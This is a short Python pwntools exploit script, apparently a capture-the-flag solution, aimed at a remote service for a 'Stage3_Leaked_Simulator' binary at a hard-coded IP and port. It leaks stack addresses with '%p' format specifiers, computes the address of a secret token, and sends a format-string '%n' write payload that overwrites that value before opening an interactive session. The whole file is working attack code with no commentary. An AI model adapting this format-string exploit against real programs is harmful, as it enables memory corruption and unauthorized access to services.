from pwn import *

# r = process('./Stage3_Leaked_Simulator.o')
r = remote("128.134.83.160", "41403")

offset = 5
target_value = 0x1234

r.sendlineafter(b"Enter your user ID: ", b"id")

r.sendlineafter(b"Choice: ", b"2")

r.sendlineafter(b"Enter log content to simulate: ", b"%p %p %p")
leak_data = r.recvline().strip()

leaked_addr = int(leak_data.split()[-3], 16)

secret_token_addr = leaked_addr + 0x74
r.sendlineafter(b"Choice: ", b"2")
payload = p32(secret_token_addr)
payload += b"%4618c%5$naaaaa"
r.sendlineafter(b"Enter log content to simulate: ", payload)
r.interactive()                 